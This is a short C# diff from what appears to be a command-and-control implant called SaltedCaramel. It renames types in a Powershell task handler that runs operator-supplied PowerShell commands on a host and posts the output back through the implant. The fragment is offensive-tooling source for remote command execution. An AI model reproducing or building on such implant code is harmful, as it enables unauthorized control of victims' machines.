@@ -7,7 +7,7 @@ namespace SaltedCaramel.Tasks
 {
     class Powershell
     {
-        internal static void Execute(SaltedCaramelTask task, SaltedCaramelImplant implant)
+        internal static void Execute(SCTask task, SCImplant implant)
         {
             string args = task.@params;
 
@@ -15,8 +15,8 @@ namespace SaltedCaramel.Tasks
             {
                 string result = Shell.PowerShellExecute(args);
 
-                TaskResponse response = new TaskResponse(JsonConvert.SerializeObject(result), task.id);
-                implant.PostResponse(response);
+                SCTaskResp response = new SCTaskResp(JsonConvert.SerializeObject(result), task.id);
+                implant.SCPostResp(response);
                 implant.SendComplete(task.id);
             }
             catch (Exception e)
